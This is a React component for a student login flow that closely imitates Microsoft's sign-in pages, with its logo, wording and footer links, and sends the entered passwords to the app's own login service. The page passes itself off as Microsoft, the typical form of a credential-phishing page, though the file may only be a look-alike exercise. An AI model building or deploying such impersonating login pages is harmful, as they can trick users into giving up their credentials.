import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import './student-login.css';
import { loginUser, saveAccount, getSavedAccounts, removeSavedAccount } from '../../services/authService';
import type { LoginStep, SavedAccount } from './types';

const StudentLogin: React.FC = () => {
    const navigate = useNavigate();
    
    // Get saved accounts fresh on every render
    const initialAccounts = getSavedAccounts();
    const [savedAccounts, setSavedAccounts] = useState<SavedAccount[]>(initialAccounts);
    const [currentStep, setCurrentStep] = useState<LoginStep>(
        initialAccounts.length > 0 ? 'pick-account' : 'email'
    );
    
    // Debug log
    console.log('[Login] Saved accounts:', initialAccounts, 'Step:', initialAccounts.length > 0 ? 'pick-account' : 'email');
    
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [selectedEmail, setSelectedEmail] = useState('');
    const [loginError, setLoginError] = useState('');
    const [emailError, setEmailError] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showForgetDropdown, setShowForgetDropdown] = useState<string | null>(null);
    const [isTransitioning, setIsTransitioning] = useState(false);
    
    const dropdownRef = useRef<HTMLDivElement>(null);

    useEffect(() => {
        document.body.style.cursor = 'auto';
    }, []);

    useEffect(() => {
        const handleClickOutside = (event: MouseEvent) => {
            if (dropdownRef.current && !dropdownRef.current.contains(event.target as Node)) {
                setShowForgetDropdown(null);
            }
        };
        document.addEventListener('mousedown', handleClickOutside);
        return () => document.removeEventListener('mousedown', handleClickOutside);
    }, []);

    const handleEmailSubmit = (e: React.FormEvent) => {
        e.preventDefault();
        setEmailError('');
        if (!email.trim() || !email.includes('@') || !email.includes('.')) {
            setEmailError('Enter a valid email address or phone number.');
            return;
        }
        setSelectedEmail(email);
        setCurrentStep('password');
    };

    const handleAccountSelect = (accountEmail: string) => {
        setIsLoading(true);
        setSelectedEmail(accountEmail);
        setTimeout(() => {
            setCurrentStep('password');
            setIsLoading(false);
        }, 600);
    };


    const handlePasswordSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setLoginError('');
        setIsLoading(true);
        try {
            const result = await loginUser(selectedEmail, password);
            if (result.success && result.user) {
                saveAccount(result.user.email, result.user.full_name);
                navigate('/dashboard');
            } else {
                setLoginError(result.error || 'Your account or password is incorrect.');
                setPassword('');
            }
        } catch (err) {
            setLoginError('An error occurred. Please try again.');
            setPassword('');
        } finally {
            setIsLoading(false);
        }
    };

    const handleBack = () => {
        setPassword('');
        setLoginError('');
        setCurrentStep(savedAccounts.length > 0 ? 'pick-account' : 'email');
    };

    const handleUseAnotherAccount = () => {
        setEmail('');
        setCurrentStep('email');
    };

    const handleForgetAccount = (accountEmail: string) => {
        removeSavedAccount(accountEmail);
        const updated = getSavedAccounts();
        setSavedAccounts(updated);
        setShowForgetDropdown(null);
        if (updated.length === 0) setCurrentStep('email');
    };

    const handleSignInOptionsClick = () => {
        setIsTransitioning(true);
        setTimeout(() => {
            setCurrentStep('sign-in-options');
            setIsTransitioning(false);
        }, 300);
    };

    const handleBackFromSignInOptions = () => {
        setIsTransitioning(true);
        setTimeout(() => {
            setCurrentStep('email');
            setIsTransitioning(false);
        }, 300);
    };

    const renderEmailScreen = () => (
        <div className="login-container">
            <div className="login-card">
                <div className="logo">
                    <img src="/images/Microsoft-Logo.png" alt="Microsoft" className="microsoft-logo-img" />
                </div>
                <div className={`card-content${isTransitioning ? ' slide-out-left' : ''}`}>
                    <h1 className="title">Sign in</h1>
                    <form onSubmit={handleEmailSubmit}>
                        {emailError && <div className="input-error-message">{emailError}</div>}
                        <div className="form-group">
                            <input type="text" className={`form-input${emailError ? ' input-error' : ''}`} placeholder={emailError ? '' : 'Email or phone'} value={email}
                                onChange={(e) => { setEmail(e.target.value); setEmailError(''); }} autoFocus />
                        </div>
                        <a href="#" className="forgot-password" style={{ display: 'block' }}>Can't access your account?</a>
                        <div className="button-group" style={{ justifyContent: 'flex-end', marginTop: '50px' }}>
                            <button type="submit" className="submit-btn">Next</button>
                        </div>
                    </form>
                </div>
            </div>
            <div className={`sign-in-options${isTransitioning ? ' fade-out' : ''}`} tabIndex={0} onClick={handleSignInOptionsClick}>
                <div className="sign-in-options-inner">
                    <div className="sign-in-options-icon">
                        <img src="/images/icons8-key-security-50.png" alt="Key" width="24" height="24" />
                    </div>
                    <span className="sign-in-options-text">Sign-in options</span>
                </div>
            </div>
            <footer className="page-footer">
                <a href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank" rel="noreferrer" className="footer-link-small">Terms of use</a>
                <a href="https://www.microsoft.com/en-US/privacy/privacystatement" target="_blank" rel="noreferrer" className="footer-link-small">Privacy & cookies</a>
                <a href="#" className="footer-link-small footer-dots">•  •  •</a>
            </footer>
        </div>
    );


    const renderPickAccountScreen = () => (
        <div className="login-container">
            <div className="login-card">
                {isLoading && <div className="dot-floating-container"><div className="dot-floating"><span className="dot dot-1"></span><span className="dot dot-2"></span><span className="dot dot-3"></span></div></div>}
                <div className="logo"><img src="/images/Microsoft-Logo.png" alt="Microsoft" className="microsoft-logo-img" /></div>
                <h1 className="title">Pick an account</h1>
                <div className="account-list">
                    {savedAccounts.map((account) => (
                        <div key={account.email} className="account-item first-account" tabIndex={0} onClick={() => handleAccountSelect(account.email)}>
                            <div className="account-avatar">
                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="40" height="40" color="#666666" fill="none">
                                    <path d="M8.5 18C10.3135 16.0463 13.667 15.9543 15.5 18M13.9406 12C13.9406 13.1046 13.0688 14 11.9934 14C10.918 14 10.0462 13.1046 10.0462 12C10.0462 10.8954 10.918 10 11.9934 10C13.0688 10 13.9406 10.8954 13.9406 12Z" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"></path>
                                    <path d="M9.5 4.00195C6.85561 4.01181 5.44101 4.10427 4.52513 4.97195C3.5 5.94312 3.5 7.5062 3.5 10.6324V15.3692C3.5 18.4954 3.5 20.0584 4.52513 21.0296C5.55025 22.0008 7.20017 22.0008 10.5 22.0008H13.5C16.7998 22.0008 18.4497 22.0008 19.4749 21.0296C20.5 20.0584 20.5 18.4954 20.5 15.3692V10.6324C20.5 7.5062 20.5 5.94312 19.4749 4.97195C18.559 4.10427 17.1444 4.01181 14.5 4.00195" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"></path>
                                    <path d="M9.77216 3.63163C9.8681 3.21682 9.91608 3.00942 10.0082 2.84004C10.2229 2.44546 10.6188 2.15548 11.0914 2.0467C11.2943 2 11.5296 2 12 2C12.4704 2 12.7057 2 12.9086 2.0467C13.3812 2.15548 13.7771 2.44545 13.9918 2.84004C14.0839 3.00942 14.1319 3.21682 14.2278 3.63163L14.3111 3.99176C14.4813 4.72744 14.5664 5.09528 14.438 5.37824C14.3549 5.5615 14.2132 5.71842 14.031 5.82911C13.7496 6 13.3324 6 12.4981 6H11.5019C10.6676 6 10.2504 6 9.96901 5.82911C9.78677 5.71842 9.6451 5.5615 9.56197 5.37824C9.43361 5.09528 9.51869 4.72744 9.68886 3.99176L9.77216 3.63163Z" stroke="currentColor" strokeWidth="1.5"></path>
                                </svg>
                            </div>
                            <div className="account-info"><span className="account-email">{account.email}</span></div>
                            <div className="account-options-wrapper" ref={showForgetDropdown === account.email ? dropdownRef : null}>
                                <button className="account-options" onClick={(e) => { e.stopPropagation(); setShowForgetDropdown(showForgetDropdown === account.email ? null : account.email); }}>⋮</button>
                                {showForgetDropdown === account.email && <div className="forget-dropdown"><button className="forget-option" onClick={(e) => { e.stopPropagation(); handleForgetAccount(account.email); }}>Forget</button></div>}
                            </div>
                        </div>
                    ))}
                    <div className="account-item add-account" tabIndex={0} onClick={handleUseAnotherAccount}>
                        <div className="account-avatar add-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M12 5V19M5 12H19" stroke="#666666" strokeWidth="2" strokeLinecap="round" /></svg></div>
                        <div className="account-info"><span className="account-email">Use another account</span></div>
                    </div>
                </div>
            </div>
            <footer className="page-footer">
                <a href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank" rel="noreferrer" className="footer-link-small">Terms of use</a>
                <a href="https://www.microsoft.com/en-US/privacy/privacystatement" target="_blank" rel="noreferrer" className="footer-link-small">Privacy & cookies</a>
                <a href="#" className="footer-link-small footer-dots">•  •  •</a>
            </footer>
        </div>
    );

    const renderPasswordScreen = () => (
        <div className="password-modal" style={{ display: 'flex' }}>
            <div className="login-card password-card">
                {isLoading && <div className="dot-floating-container"><div className="dot-floating"><span className="dot dot-1"></span><span className="dot dot-2"></span><span className="dot dot-3"></span></div></div>}
                <div className="logo"><img src="/images/Microsoft-Logo.png" alt="Microsoft" className="microsoft-logo-img" /></div>
                <div style={{ display: 'flex', alignItems: 'center', marginBottom: '8px', marginLeft: '-8px' }}>
                    <button className="back-btn-wrapper" onClick={handleBack}><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M18,11.578v.844H7.617l3.921,3.928-.594.594L6,12l4.944-4.944.594.594L7.617,11.578Z" fill="#404040" /></svg></button>
                    <span className="email-text">{selectedEmail}</span>
                </div>
                <h1 className="title">Enter password</h1>
                <form className="password-form" onSubmit={handlePasswordSubmit}>
                    <div className="form-group">
                        <input type="password" className="form-input" placeholder="Password" required value={password} onChange={(e) => { setPassword(e.target.value); setLoginError(''); }} disabled={isLoading} autoFocus />
                    </div>
                    {loginError && <div style={{ color: '#d93025', fontSize: '13px', marginBottom: '12px', display: 'flex', alignItems: 'center', gap: '6px' }}><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>{loginError}</div>}
                    <a href="#" className="forgot-password">Forgot my password</a>
                    <div className="button-group"><button type="submit" className="submit-btn" disabled={isLoading} style={{ opacity: isLoading ? 0.7 : 1 }}>{isLoading ? 'Signing in...' : 'Sign in'}</button></div>
                </form>
            </div>
            <footer className="page-footer">
                <a href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank" rel="noreferrer" className="footer-link-small">Terms of use</a>
                <a href="https://www.microsoft.com/en-US/privacy/privacystatement" target="_blank" rel="noreferrer" className="footer-link-small">Privacy & cookies</a>
                <a href="#" className="footer-link-small footer-dots">•  •  •</a>
            </footer>
        </div>
    );


    const renderSignInOptionsScreen = () => (
        <div className="login-container">
            <div className="login-card sign-in-options-card">
                <div className="logo">
                    <img src="/images/Microsoft-Logo.png" alt="Microsoft" className="microsoft-logo-img" />
                </div>
                <div className={`card-content${isTransitioning ? ' slide-out-right' : ' slide-in-left'}`}>
                    <h1 className="title">Sign-in options</h1>
                    <div className="sign-in-options-list">
                        <div className="sign-in-option-item" tabIndex={0}>
                            <div className="sign-in-option-icon">
                                <svg width="36" height="36" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <circle cx="18" cy="16" r="10" fill="#1b1b1b"/>
                                    <path d="M6 44c0-8.837 5.373-16 12-16s12 7.163 12 16" fill="#1b1b1b"/>
                                    <circle cx="36" cy="18" r="8" fill="#1b1b1b"/>
                                    <path d="M36 14v8M32 18h8" stroke="white" strokeWidth="2" strokeLinecap="round"/>
                                </svg>
                            </div>
                            <div className="sign-in-option-info">
                                <span className="sign-in-option-title">Face, fingerprint, PIN or security key</span>
                                <span className="sign-in-option-desc">Use your device to sign in with a passkey.</span>
                            </div>
                            <div className="sign-in-option-help">
                                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="1.5">
                                    <circle cx="12" cy="12" r="10"/>
                                    <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/>
                                    <circle cx="12" cy="17" r="0.5" fill="#666"/>
                                </svg>
                            </div>
                        </div>
                        <div className="sign-in-option-item" tabIndex={0}>
                            <div className="sign-in-option-icon">
                                <svg width="36" height="36" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <rect x="10" y="6" width="28" height="36" rx="2" stroke="#666" strokeWidth="2" fill="none"/>
                                    <circle cx="24" cy="22" r="6" stroke="#666" strokeWidth="2" fill="none"/>
                                    <path d="M16 36c0-4.418 3.582-8 8-8s8 3.582 8 8" stroke="#666" strokeWidth="2" fill="none"/>
                                </svg>
                            </div>
                            <div className="sign-in-option-info">
                                <span className="sign-in-option-title">Sign in to an organization</span>
                                <span className="sign-in-option-desc">Search for a company or an organization you're working with.</span>
                            </div>
                        </div>
                    </div>
                    <div className="button-group" style={{ justifyContent: 'flex-end', marginTop: '30px' }}>
                        <button type="button" className="back-btn" onClick={handleBackFromSignInOptions}>Back</button>
                    </div>
                </div>
            </div>
            <footer className="page-footer">
                <a href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank" rel="noreferrer" className="footer-link-small">Terms of use</a>
                <a href="https://www.microsoft.com/en-US/privacy/privacystatement" target="_blank" rel="noreferrer" className="footer-link-small">Privacy & cookies</a>
                <a href="#" className="footer-link-small footer-dots">•  •  •</a>
            </footer>
        </div>
    );

    return (
        <div className="student-login-wrapper">
            {currentStep === 'email' && renderEmailScreen()}
            {currentStep === 'pick-account' && renderPickAccountScreen()}
            {currentStep === 'password' && renderPasswordScreen()}
            {currentStep === 'sign-in-options' && renderSignInOptionsScreen()}
        </div>
    );
};

export default StudentLogin;
